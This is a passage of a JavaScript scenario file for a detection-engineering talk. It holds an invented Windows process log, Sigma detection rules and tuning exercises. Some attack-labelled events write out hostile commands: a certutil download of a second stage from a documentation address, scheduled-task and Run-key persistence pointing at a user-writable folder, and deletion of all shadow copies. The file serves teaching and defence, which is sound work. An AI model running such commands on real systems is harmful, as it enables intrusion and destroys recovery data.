/* scenario.js - the made-up data and the scoring behind the demos in "Detection Engineering". No DOM, so it runs in the browser (window.Scen) and in Node.
   Everything here is invented: the events, hosts, accounts, products and the threat report. Addresses use documentation ranges (203.0.113.0/24) and
   names use .test and .example domains. The base64 strings decode to harmless text ("Get-Date", "Write-Output 'test'"); the file hashes are hashes of
   made-up strings. Every outcome the demos show comes from running the rule engine in rules.js over this data: nothing is hard-coded. */
(function (root) {
  "use strict";
  const R = root.Rules || require("./rules.js");
  const Lab = root.Lab || require("../../shared/crypto.js");
  const sha = (s) => Lab.hex(Lab.sha256(Lab.utf8(s))).toUpperCase();

  // =========================================================================== ATT&CK techniques used in the talk (names checked against Enterprise ATT&CK v20.1)
  const TECH = {
    "T1566": "Phishing", "T1566.001": "Spearphishing Attachment", "T1204": "User Execution", "T1204.002": "Malicious File",
    "T1059": "Command and Scripting Interpreter", "T1059.001": "PowerShell", "T1059.003": "Windows Command Shell",
    "T1053.005": "Scheduled Task", "T1547.001": "Registry Run Keys / Startup Folder", "T1543.003": "Windows Service",
    "T1055": "Process Injection", "T1078": "Valid Accounts", "T1110.003": "Password Spraying", "T1003.001": "LSASS Memory",
    "T1021.001": "Remote Desktop Protocol", "T1105": "Ingress Tool Transfer", "T1071": "Application Layer Protocol",
    "T1041": "Exfiltration Over C2 Channel", "T1567": "Exfiltration Over Web Service", "T1486": "Data Encrypted for Impact",
    "T1490": "Inhibit System Recovery", "T1685.005": "Clear Windows Event Logs", "T1070": "Indicator Removal",
    "T1218.011": "Rundll32", "T1027": "Obfuscated Files or Information", "T1136": "Create Account", "T1098": "Account Manipulation",
    "T1569.002": "Service Execution", "T1074": "Data Staged",
  };
  const TECHNIQUE_IDS = Object.keys(TECH);
  const ATTACK_VERSION = "v20.1";

  // =========================================================================== the made-up process-creation log (the playground)
  const ENC_DATE = "RwBlAHQALQBEAGEAdABlAA==";                       // base64 of UTF-16 "Get-Date"
  const ENC_TEST = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAJwA=";   // "Write-Output 'test'"
  const W = "C:\\Windows\\System32\\", PSX = W + "WindowsPowerShell\\v1.0\\powershell.exe", OFF = "C:\\Program Files\\Microsoft Office\\root\\Office16\\";
  const EXPL = "C:\\Windows\\explorer.exe", SYS = "NT AUTHORITY\\SYSTEM";
  const CHROME = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", EDGE = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
  const AGENT = "C:\\Program Files\\ContosoMonitor\\agent.exe", MDM = "C:\\Program Files\\ContosoMDM\\mdmagent.exe";
  const BACKUP = "C:\\Program Files\\ContosoBackup\\backupagent.exe", DEPLOY = "C:\\ProgramData\\Contoso\\deploy.exe";
  const ORIG = { "powershell.exe": "PowerShell.EXE", "certutil.exe": "CertUtil.exe", "vssadmin.exe": "VSSADMIN.EXE" };   // names as SigmaHQ's own rules use them
  const base = (p) => p.split("\\").pop().toLowerCase();
  let seq = 0;
  function pe(time, host, user, parent, image, cmd, label, note, extra) {
    const e = {
      _id: ++seq, _category: "process_creation", _label: label || "benign", _note: note || "",
      UtcTime: "2026-11-09 " + time, Computer: host, User: user, ParentImage: parent, ParentCommandLine: '"' + parent + '"',
      Image: image, CommandLine: cmd, IntegrityLevel: /SYSTEM/.test(user) ? "System" : /\\adm-/.test(user) ? "High" : "Medium",
      Hashes: "SHA256=" + sha("demo-image|" + image.toLowerCase()),
    };
    const o = ORIG[base(image)]; if (o) e.OriginalFileName = o;
    return Object.assign(e, extra || {});
  }
  const q = (p) => '"' + p + '"';
  const PLAY_EVENTS = [
    pe("08:51:10", "WS-114", "CORP\\ana", EXPL, CHROME, q(CHROME)),
    pe("08:52:41", "WS-114", "CORP\\ana", EXPL, OFF + "OUTLOOK.EXE", q(OFF + "OUTLOOK.EXE")),
    pe("08:55:03", "WS-114", "CORP\\ana", OFF + "OUTLOOK.EXE", EDGE, q(EDGE) + " https://intranet.example.test/news", "benign", "Outlook opens a link: an Office parent, but the child is a browser, not a script interpreter."),
    pe("09:02:19", "FIN-LT-03", "CORP\\mo", EXPL, OFF + "EXCEL.EXE", q(OFF + "EXCEL.EXE") + " \\\\fs01\\finance\\Q3-model.xlsm"),
    pe("09:02:44", "FIN-LT-03", "CORP\\mo", OFF + "EXCEL.EXE", PSX, "powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File \\\\fs01\\finance\\refresh.ps1", "benign",
       "Tricky benign: a finance workbook runs a signed refresh script. An Office parent with PowerShell as the child, and legitimate.",
       { ParentCommandLine: q(OFF + "EXCEL.EXE") + " \\\\fs01\\finance\\Q3-model.xlsm" }),
    pe("09:10:07", "WS-221", "CORP\\raj", EXPL, EDGE, q(EDGE)),
    pe("09:14:30", "WS-114", SYS, "C:\\Windows\\System32\\services.exe", W + "svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule"),
    pe("09:18:52", "WS-221", "CORP\\raj", EXPL, OFF + "WINWORD.EXE", q(OFF + "WINWORD.EXE")),
    pe("09:19:20", "WS-221", "CORP\\raj", OFF + "WINWORD.EXE", EDGE, q(EDGE) + " https://wiki.example.test/style-guide"),
    pe("09:25:41", "WS-114", "CORP\\ana", EXPL, "C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\Users\\ana\\notes.txt"),
    pe("09:31:00", "WS-114", SYS, AGENT, PSX, "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + ENC_DATE, "benign",
       "Tricky benign: a monitoring agent runs encoded PowerShell on every host, all day. It looks like an attacker's habit and is routine here."),
    pe("09:31:02", "WS-221", SYS, AGENT, PSX, "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + ENC_DATE, "benign", "The same monitoring agent on another host."),
    pe("09:31:05", "SRV-APP-02", SYS, AGENT, PSX, "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + ENC_DATE, "benign", "The same monitoring agent on a server."),
    pe("09:40:12", "WS-114", "CORP\\adm-ana", EXPL, W + "cmd.exe", "C:\\Windows\\System32\\cmd.exe"),
    pe("09:40:30", "WS-114", "CORP\\adm-ana", W + "cmd.exe", W + "ping.exe", "ping.exe 10.1.1.1"),
    pe("09:44:18", "WS-114", "CORP\\adm-ana", EXPL, PSX, "powershell.exe", "benign", "An administrator opens PowerShell by hand."),
    pe("09:44:41", "WS-114", "CORP\\adm-ana", PSX, W + "ipconfig.exe", "ipconfig.exe /all"),
    pe("09:45:05", "WS-114", "CORP\\adm-ana", PSX, W + "whoami.exe", "whoami.exe /groups"),
    pe("09:47:22", "WS-114", "CORP\\adm-ana", PSX, W + "certutil.exe", "certutil.exe -verify C:\\certs\\root.cer", "benign", "An admin checks a certificate: certutil, but not downloading anything."),
    pe("09:48:10", "WS-114", "CORP\\adm-ana", PSX, W + "certutil.exe", "certutil.exe -hashfile C:\\iso\\win.iso SHA256", "benign", "An admin hashes a file with certutil."),
    pe("09:49:03", "WS-114", "CORP\\adm-ana", PSX, W + "certutil.exe", "certutil.exe -urlcache * delete", "benign",
       "Tricky benign: this clears certutil's URL cache. It contains 'urlcache', and no URL, so it isn't a download."),
    pe("09:50:44", "WS-114", "CORP\\adm-ana", PSX, W + "schtasks.exe", "schtasks.exe /query /fo LIST"),
    pe("09:55:31", "SRV-APP-02", SYS, BACKUP, W + "vssadmin.exe", "vssadmin.exe delete shadows /for=C: /oldest", "benign",
       "Tricky benign: the backup product trims its own oldest shadow copy every night. A rule that sees only 'delete shadows' will page for it."),
    pe("09:58:00", "WS-114", "CORP\\adm-ana", EXPL, W + "vssadmin.exe", "vssadmin.exe list shadows"),
    pe("10:05:14", "SRV-APP-02", SYS, DEPLOY, W + "schtasks.exe", 'schtasks.exe /create /tn "Contoso Patch Check" /tr "C:\\Program Files\\Contoso\\patch.exe" /sc daily', "benign",
       "Tricky benign: the deployment tool creates a scheduled task, and the program it runs is in Program Files, not a folder anyone can write to."),
    pe("10:09:50", "WS-221", "CORP\\raj", EXPL, "C:\\Windows\\System32\\calc.exe", "calc.exe"),
    pe("10:12:03", "AP-LT-07", "CORP\\pat", EXPL, OFF + "EXCEL.EXE", q(OFF + "EXCEL.EXE") + " C:\\Users\\pat\\Downloads\\invoice_Oct.xlsm", "benign", "Pat opens an emailed workbook: nothing odd yet.",
       { ParentCommandLine: q(EXPL) }),
    pe("10:12:31", "AP-LT-07", "CORP\\pat", OFF + "EXCEL.EXE", PSX, "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " + ENC_TEST, "attack",
       "ATTACK: Excel starts PowerShell with a hidden window and an encoded command (T1059.001). The same behaviour as the report's step 2.",
       { _beh: "office", ParentCommandLine: q(OFF + "EXCEL.EXE") + " C:\\Users\\pat\\Downloads\\invoice_Oct.xlsm" }),
    pe("10:12:40", "AP-LT-07", "CORP\\pat", PSX, W + "certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.50/stage2.txt C:\\Users\\Public\\stage2.txt", "attack",
       "ATTACK: certutil downloads a file from an external address (T1105).", { _beh: "certutil" }),
    pe("10:12:55", "AP-LT-07", "CORP\\pat", PSX, W + "schtasks.exe", 'schtasks.exe /create /tn "OneDrive Sync Helper" /tr C:\\Users\\Public\\svc_update.exe /sc onlogon /f', "attack",
       "ATTACK: a scheduled task runs a program from C:\\Users\\Public, a folder every user can write to (T1053.005).", { _beh: "task" }),
    pe("10:13:20", "AP-LT-07", "CORP\\pat", PSX, W + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "attack",
       "ATTACK: every shadow copy is deleted, the step before encryption (T1490).", { _beh: "vss" }),
    pe("10:20:08", "WS-221", "CORP\\raj", EXPL, EDGE, q(EDGE) + " https://example.test/"),
    pe("10:33:47", "AP-LT-12", "CORP\\lee", EXPL, OFF + "WINWORD.EXE", q(OFF + "WINWORD.EXE") + " C:\\Users\\lee\\Downloads\\remittance.docm", "benign", "Lee opens an emailed document.", { ParentCommandLine: q(EXPL) }),
    pe("10:33:58", "AP-LT-12", "CORP\\lee", OFF + "WINWORD.EXE", PSX, "powershell.exe -w hidden -enc " + ENC_TEST, "attack",
       "ATTACK: the same behaviour with shorter flags: Word starts PowerShell with a hidden window and an encoded command (T1059.001).",
       { _beh: "office", ParentCommandLine: q(OFF + "WINWORD.EXE") + " C:\\Users\\lee\\Downloads\\remittance.docm" }),
    pe("10:48:15", "WS-114", "CORP\\ana", CHROME, CHROME, q(CHROME) + " --type=renderer"),
    pe("11:02:30", "WS-221", SYS, "C:\\Windows\\System32\\services.exe", W + "svchost.exe", "C:\\Windows\\System32\\svchost.exe -k LocalService"),
    pe("11:15:09", "WS-114", "CORP\\ana", EXPL, "C:\\Program Files\\Microsoft VS Code\\Code.exe", q("C:\\Program Files\\Microsoft VS Code\\Code.exe")),
    pe("11:27:40", "WS-221", "CORP\\raj", "C:\\Program Files\\Microsoft\\Teams\\teams.exe", "C:\\Program Files\\Microsoft\\Teams\\msedgewebview2.exe", "msedgewebview2.exe --type=gpu-process"),
    pe("11:40:02", "SRV-APP-02", SYS, "C:\\Windows\\System32\\services.exe", W + "svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"),
  ];
  const ATTACK_BEHAVIOURS = [
    { id: "office", name: "Office app starts PowerShell with an encoded command", attack: "T1059.001", events: PLAY_EVENTS.filter((e) => e._beh === "office").length },
    { id: "certutil", name: "certutil downloads a file", attack: "T1105", events: 1 },
    { id: "task", name: "Scheduled task runs a program from a user-writable folder", attack: "T1053.005", events: 1 },
    { id: "vss", name: "Shadow copies deleted", attack: "T1490", events: 1 },
  ];

  // rule presets for the playground ----------------------------------------------------------------------------------------------------------------------
  const PRESETS = {
    office: String.raw`title: Script Interpreter Started By An Office Application
id: 6f1c3a52-9b7e-4d0a-8e21-5c4d7a90b3e1
status: experimental
description: An Office application starts PowerShell or the command shell, which is how a malicious macro often runs its next step.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.execution
    - attack.t1059.001
    - attack.t1059.003
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\excel.exe'
            - '\winword.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
    filter_finance:
        CommandLine|contains: 'finance\refresh.ps1'
    condition: all of selection_* and not 1 of filter_*
falsepositives:
    - A finance workbook that calls a signed refresh script
level: medium
`,
    broad: String.raw`title: PowerShell Started
id: 2b8e0c71-4a5d-4f3e-9c16-7d1a3e5f8b20
status: experimental
description: Any PowerShell process.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
    condition: selection
falsepositives:
    - Almost everything
level: high
`,
    narrow: String.raw`title: Hidden Encoded PowerShell From Excel
id: 9d4c7e12-0b3a-4c85-a1f6-3e8b2d5c7a49
status: experimental
description: Exactly the command line seen in the first sample.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine: 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ` + ENC_TEST + String.raw`'
    condition: selection
falsepositives:
    - Unknown
level: medium
`,
    encoded: String.raw`title: PowerShell With An Encoded Command
id: 4a6f1d93-8c2e-47b0-b5d9-0e7a3c1f6842
status: experimental
description: PowerShell started with an encoded command.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains: ' -enc'
    condition: selection
falsepositives:
    - Monitoring and management agents
level: medium
`,
    certutil: String.raw`title: Download With certutil
id: 71c3a9e5-2d48-4b06-8f1a-6e5d0b9c3a17
status: experimental
description: certutil used with its URL-cache option and a web address, a way to fetch a file with a tool that is already installed.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.command-and-control
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_flags:
        CommandLine|windash|contains:
            - '-urlcache '
            - '-verifyctl '
    selection_http:
        CommandLine|contains: 'http'
    condition: all of selection_*
falsepositives:
    - Administrators fetching certificate revocation lists
level: medium
`,
    task: String.raw`title: Scheduled Task Running A Program From A User-Writable Folder
id: c5e82a40-6f1b-49d3-a07e-1b4d9f3c6e58
status: experimental
description: A scheduled task is created that runs a program from a folder any user can write to.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.persistence
    - attack.t1053.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith: '\schtasks.exe'
    selection_cli:
        CommandLine|contains|all:
            - ' /create '
            - '\users\'
    condition: all of selection_*
falsepositives:
    - Per-user software that installs its own task
level: medium
`,
    vss: String.raw`title: Shadow Copies Deleted
id: 0e9b4d17-3a62-4c58-b1f4-8d2c6a5e7093
status: experimental
description: The volume shadow copy tool is used to delete shadow copies, a common step before data is encrypted.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.impact
    - attack.t1490
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\vssadmin.exe'
        - OriginalFileName: 'VSSADMIN.EXE'
    selection_cli:
        CommandLine|contains|all:
            - 'shadow'
            - 'delete'
    condition: all of selection_*
falsepositives:
    - Backup software that trims its own shadow copies
level: high
`,
    all: String.raw`title: Four Behaviours Seen In The Marmalade Moth Report
id: 5f7a2c93-1e84-4d06-9b3a-2c8e6d0f4a71
status: experimental
description: One rule file that covers the report's four behaviours, with the two known-benign cases filtered by what makes them specific.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.execution
    - attack.t1059.001
    - attack.command-and-control
    - attack.t1105
    - attack.persistence
    - attack.t1053.005
    - attack.impact
    - attack.t1490
logsource:
    category: process_creation
    product: windows
detection:
    selection_office_parent:
        ParentImage|endswith:
            - '\excel.exe'
            - '\winword.exe'
    selection_office_child:
        Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
    selection_certutil_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_certutil_flags:
        CommandLine|windash|contains: '-urlcache '
    selection_certutil_http:
        CommandLine|contains: 'http'
    selection_task_img:
        Image|endswith: '\schtasks.exe'
    selection_task_cli:
        CommandLine|contains|all:
            - ' /create '
            - '\users\'
    selection_vss_img:
        - Image|endswith: '\vssadmin.exe'
        - OriginalFileName: 'VSSADMIN.EXE'
    selection_vss_cli:
        CommandLine|contains|all:
            - 'shadow'
            - 'delete'
    filter_finance:
        CommandLine|contains: 'finance\refresh.ps1'
    filter_backup:
        ParentImage: 'C:\Program Files\ContosoBackup\backupagent.exe'
        User: 'NT AUTHORITY\SYSTEM'
    condition: >-
        (all of selection_office_* or all of selection_certutil_*
        or all of selection_task_* or all of selection_vss_*)
        and not 1 of filter_*
falsepositives:
    - Software that behaves like an attacker on purpose: add a narrow filter, and say why
level: high
`,
  };
  const PRESET_LABELS = [
    ["office", "Office app starts a shell"], ["broad", "Any PowerShell (too broad)"], ["narrow", "One exact command (too narrow)"],
    ["encoded", "Encoded PowerShell"], ["certutil", "certutil download"], ["task", "Scheduled task, user folder"], ["vss", "Shadow copies deleted"], ["all", "All four behaviours"],
  ];

  // =========================================================================== telemetry profiles: write for the data you actually have
  const TELEMETRY = [
    { id: "sysmon", name: "Sysmon, event 1", fields: ["Image", "OriginalFileName", "CommandLine", "ParentImage", "ParentCommandLine", "User", "IntegrityLevel", "Hashes", "Computer", "UtcTime"],
      note: "Sysmon's process-creation event records the full command line of the process and of its parent, the file's original name and its hashes (hashes are chosen in the configuration)." },
    { id: "sec4688", name: "Windows Security 4688, command-line policy ON", fields: ["Image", "CommandLine", "ParentImage", "User", "IntegrityLevel", "Computer", "UtcTime"],
      note: "Event 4688 has the new process and its parent process, but no file hashes and no original file name. Its command-line field is only filled when the 'Include command line in process creation events' policy is on. IntegrityLevel arrives as a SID (a label such as S-1-16-8192), so a pipeline must translate it." },
    { id: "sec4688off", name: "Windows Security 4688, command-line policy OFF (the default)", fields: ["Image", "ParentImage", "User", "IntegrityLevel", "Computer", "UtcTime"], blankCmd: true,
      note: "By default the command-line field of event 4688 is empty. Every rule that looks at CommandLine silently stops matching, and nothing reports an error." },
    { id: "edr", name: "An EDR product (made up)", fields: ["Image", "OriginalFileName", "CommandLine", "ParentImage", "ParentCommandLine", "User", "IntegrityLevel", "Hashes", "Computer", "UtcTime"],
      note: "Products differ. Check the fields your own source gives you before you copy a rule written for another one." },
  ];
  function degrade(events, profileId) {
    const p = TELEMETRY.find((t) => t.id === profileId) || TELEMETRY[0];
    return events.map((e) => {
      const o = {};
      for (const k of Object.keys(e)) if (k[0] === "_" || p.fields.includes(k)) o[k] = e[k];
      if (p.blankCmd) o.CommandLine = "";
      return o;
    });
  }
  function missingFields(compiledFields, profileId) {
    const p = TELEMETRY.find((t) => t.id === profileId) || TELEMETRY[0];
    return compiledFields.filter((f) => !p.fields.includes(f) || (p.blankCmd && f === "CommandLine"));
  }

  // =========================================================================== the chain used to show what an attacker has to change
  const H1 = sha("svc_update.exe v1 (made-up demo file)"), H2 = sha("svc_update.exe v2 (made-up demo file, rebuilt)");
  const CHAIN_CHANGES = [
    { id: "recompile", label: "Recompile the loader (new file hash)", cost: 1 },
    { id: "rename", label: "Rename the loader file", cost: 1 },
    { id: "newip", label: "Use a new server address", cost: 1 },
    { id: "newdomain", label: "Register a new domain name", cost: 2 },
    { id: "curl", label: "Download with curl instead of certutil", cost: 4 },
  ];
  const PERSIST = [
    { id: "task", label: "Scheduled task (as in the report)", cost: 0 },
    { id: "runkey", label: "Registry Run key instead", cost: 5 },
    { id: "service", label: "A new service instead", cost: 7 },
  ];
  function chainEvents(ch) {
    ch = ch || {};
    const tool = ch.rename ? "C:\\Users\\Public\\winupdate.exe" : "C:\\Users\\Public\\svc_update.exe";
    const hash = ch.recompile ? H2 : H1;
    const ip = ch.newip ? "203.0.113.77" : "203.0.113.50";
    const dom = ch.newdomain ? "cdn-sync.example.test" : "update-cdn.example.test";
    const ev = [];
    const mk = (cat, o) => Object.assign({ _category: cat, _label: "attack", Computer: "AP-LT-07", User: "CORP\\pat" }, o);
    ev.push(mk("process_creation", { Image: tool, CommandLine: tool, ParentImage: W + "svchost.exe", Hashes: "SHA256=" + hash, _note: "the loader starts" }));
    ev.push(ch.curl
      ? mk("process_creation", { ParentImage: tool, Image: W + "curl.exe", CommandLine: "curl.exe -o C:\\Users\\Public\\stage2.txt http://" + ip + "/stage2.txt", _note: "downloads with curl" })
      : mk("process_creation", { ParentImage: tool, Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: "certutil.exe -urlcache -split -f http://" + ip + "/stage2.txt C:\\Users\\Public\\stage2.txt", _note: "downloads with certutil" }));
    const per = ch.persist || "task";
    if (per === "runkey") ev.push(mk("process_creation", { ParentImage: tool, Image: W + "reg.exe", CommandLine: 'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "OneDrive Sync Helper" /d ' + tool, _note: "persists with a Run key" }));
    else if (per === "service") ev.push(mk("process_creation", { ParentImage: tool, Image: W + "sc.exe", CommandLine: "sc.exe create OneDriveSync binPath= " + tool + " start= auto", _note: "persists as a service" }));
    else ev.push(mk("process_creation", { ParentImage: tool, Image: W + "schtasks.exe", CommandLine: 'schtasks.exe /create /tn "OneDrive Sync Helper" /tr ' + tool + " /sc onlogon /f", _note: "persists with a scheduled task" }));
    ev.push(mk("network_connection", { Image: tool, DestinationIp: ip, DestinationPort: 443, _note: "connects out" }));
    ev.push(mk("dns_query", { Image: tool, QueryName: dom, _note: "looks up its server's name" }));
    return ev;
  }
  const CHAIN_RULES = [
    { id: "hash", name: "Known file hash", rung: "Hash value", yaml: "category: process_creation\ndetection:\n    selection:\n        Hashes|contains: 'SHA256=" + H1 + "'\n    condition: selection", cat: "process_creation" },
    { id: "ip", name: "Known server address", rung: "IP address", yaml: "category: network_connection\ndetection:\n    selection:\n        DestinationIp: '203.0.113.50'\n    condition: selection", cat: "network_connection" },
    { id: "domain", name: "Known domain name", rung: "Domain name", yaml: "category: dns_query\ndetection:\n    selection:\n        QueryName|endswith: 'update-cdn.example.test'\n    condition: selection", cat: "dns_query" },
    { id: "name", name: "Known file name", rung: "Host artifact", yaml: "category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\svc_update.exe'\n    condition: selection", cat: "process_creation" },
    { id: "certutil", name: "certutil used to download", rung: "TTP, one implementation", yaml: "category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|windash|contains: '-urlcache '\n    selection_http:\n        CommandLine|contains: 'http'\n    condition: all of selection_*", cat: "process_creation" },
    { id: "task", name: "Scheduled task running from a user folder", rung: "TTP, one implementation", yaml: "category: process_creation\ndetection:\n    selection_img:\n        Image|endswith: '\\schtasks.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' /create '\n            - '\\users\\'\n    condition: all of selection_*", cat: "process_creation" },
    { id: "persist", name: "Any autostart pointing at a user folder (task or Run key)", rung: "TTP, broader", yaml: "category: process_creation\ndetection:\n    selection_task:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - ' /create '\n            - '\\users\\'\n    selection_run:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains|all:\n            - '\\CurrentVersion\\Run'\n            - '\\users\\'\n    condition: 1 of selection_*", cat: "process_creation" },
  ];
  const chainCache = {};
  function chainRun(ch, persist) {
    const changes = Object.assign({}, ch, { persist: persist || "task" });
    const events = chainEvents(changes);
    const rows = CHAIN_RULES.map((r) => {
      const c = chainCache[r.id] || (chainCache[r.id] = R.compile("title: " + r.name + "\nlogsource:\n" + r.yaml.split("\n")[0].replace(/^category:/, "    category:") + "\n" + r.yaml.split("\n").slice(1).join("\n")));
      const hits = events.filter((e) => e._category === r.cat && c.match(e));
      return { id: r.id, name: r.name, rung: r.rung, fired: hits.length > 0, hits };
    });
    const cost = CHAIN_CHANGES.reduce((s, c) => s + (ch && ch[c.id] ? c.cost : 0), 0) + (PERSIST.find((p) => p.id === (persist || "task")) || { cost: 0 }).cost;
    return { rows, cost, firing: rows.filter((r) => r.fired).length, total: rows.length, events };
  }

  // =========================================================================== the tuning lab
  const PS = "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + ENC_DATE;
  function arch(id, label, count, parent, user, cmd, parentCmd, note) {
    return { id, label, count, _label: label === "attack" ? "attack" : "benign", note, _category: "process_creation",
      ParentImage: parent, ParentCommandLine: parentCmd || '"' + parent + '"', User: user, Image: PSX, OriginalFileName: "PowerShell.EXE", CommandLine: cmd || PS };
  }
  const ARCHETYPES = [
    Object.assign(arch("agent", "benign", 1900, AGENT, SYS), { name: "Monitoring agent", note: "runs encoded PowerShell on every host, all week" }),
    Object.assign(arch("mdm", "benign", 210, MDM, SYS), { name: "Device-management agent", note: "applies settings with encoded PowerShell" }),
    Object.assign(arch("ci", "benign", 60, "C:\\BuildAgent\\bin\\agent.exe", "CI\\build-svc"), { name: "Build servers", note: "build scripts, started by the build agent" }),
    Object.assign(arch("admin", "benign", 35, EXPL, "CORP\\adm-ana", "powershell.exe -EncodedCommand " + ENC_DATE), { name: "Administrators", note: "one-off scripts pasted as encoded commands" }),
    Object.assign(arch("finance", "benign", 14, OFF + "EXCEL.EXE", "CORP\\mo", "powershell.exe -ExecutionPolicy RemoteSigned -EncodedCommand " + ENC_DATE, q(OFF + "EXCEL.EXE") + " \\\\fs01\\finance\\Q3-model.xlsm"), { name: "Finance workbook", note: "a workbook macro refreshes data" }),
    Object.assign(arch("x1", "attack", 1, OFF + "EXCEL.EXE", "CORP\\pat", "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " + ENC_TEST, q(OFF + "EXCEL.EXE") + " C:\\Users\\pat\\Downloads\\invoice_Oct.xlsm"), { name: "ATTACK: macro in an emailed workbook", note: "the report's step 2" }),
    Object.assign(arch("x2", "attack", 1, "C:\\Users\\Public\\agent.exe", "CORP\\pat", "powershell.exe -NoProfile -EncodedCommand " + ENC_TEST), { name: "ATTACK: a loader that is also called agent.exe", note: "an attacker's file with a familiar name, in a folder anyone can write to" }),
    Object.assign(arch("x3", "attack", 1, "C:\\Windows\\Temp\\svc.exe", SYS, "powershell.exe -NoProfile -EncodedCommand " + ENC_TEST), { name: "ATTACK: code running as SYSTEM", note: "after the attacker gained control of the machine" }),
    Object.assign(arch("x4", "attack", 1, EXPL, "CORP\\adm-jlee", "powershell.exe -EncodedCommand " + ENC_TEST), { name: "ATTACK: a stolen administrator account", note: "a real admin's name, used by someone else" }),
  ];
  const TUNE_FILTERS = [
    { id: "system", label: "Ignore everything running as SYSTEM", yaml: "User: 'NT AUTHORITY\\SYSTEM'", attrs: 1, note: "One attribute, and a very powerful account." },
    { id: "agentname", label: "Ignore parents called agent.exe", yaml: "ParentImage|endswith: '\\agent.exe'", attrs: 1, note: "A file name anyone can copy." },
    { id: "agentpath", label: "Ignore the monitoring agent: full path and SYSTEM", yaml: "ParentImage: 'C:\\Program Files\\ContosoMonitor\\agent.exe'\nUser: 'NT AUTHORITY\\SYSTEM'", attrs: 2, note: "A path ordinary users can't write to, plus who runs it." },
    { id: "mdm", label: "Ignore the device-management agent: full path and SYSTEM", yaml: "ParentImage: 'C:\\Program Files\\ContosoMDM\\mdmagent.exe'\nUser: 'NT AUTHORITY\\SYSTEM'", attrs: 2, note: "The same idea for the second agent." },
    { id: "ci", label: "Ignore the build account", yaml: "User: 'CI\\build-svc'", attrs: 1, note: "One attribute: if that account is misused, nothing it runs is seen." },
    { id: "admins", label: "Ignore accounts that start with CORP\\adm-", yaml: "User|startswith: 'CORP\\adm-'", attrs: 1, note: "Every administrator account, including a stolen one." },
    { id: "excelany", label: "Ignore anything started by Excel", yaml: "ParentImage|endswith: '\\excel.exe'", attrs: 1, note: "An entire application becomes a blind spot." },
    { id: "finance", label: "Ignore Excel only for the finance workbook folder", yaml: "ParentImage|endswith: '\\excel.exe'\nParentCommandLine|contains: 'finance\\Q3-model'", attrs: 2, note: "Excel, and the workbook it opened." },
  ];
  const TUNE_BASE = String.raw`title: PowerShell With An Encoded Command
id: 4a6f1d93-8c2e-47b0-b5d9-0e7a3c1f6842
status: test
description: PowerShell started with an encoded command.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains: ' -enc'
`;
  function tuneRule(enabled) {
    const on = TUNE_FILTERS.filter((f) => enabled.includes(f.id));
    let t = TUNE_BASE;
    on.forEach((f) => { t += "    filter_" + f.id + ":\n" + f.yaml.split("\n").map((l) => "        " + l).join("\n") + "\n"; });
    t += on.length ? "    condition: selection and not 1 of filter_*\n" : "    condition: selection\n";
    t += "falsepositives:\n    - Monitoring and management agents\nlevel: medium\n";
    return t;
  }
  const MINUTES_PER_ALERT = 10;       // invented, only to give the numbers a scale
  function tuneRun(enabled) {
    const text = tuneRule(enabled);
    const c = R.compile(text);
    let fp = 0, tp = 0;
    const hidden = [], caught = [];
    for (const a of ARCHETYPES) {
      const fired = c.match(a);
      if (a._label === "attack") (fired ? caught : hidden).push(a); else if (fired) fp += a.count;
      if (fired && a._label === "attack") tp += a.count;
    }
    const attacks = ARCHETYPES.filter((a) => a._label === "attack");
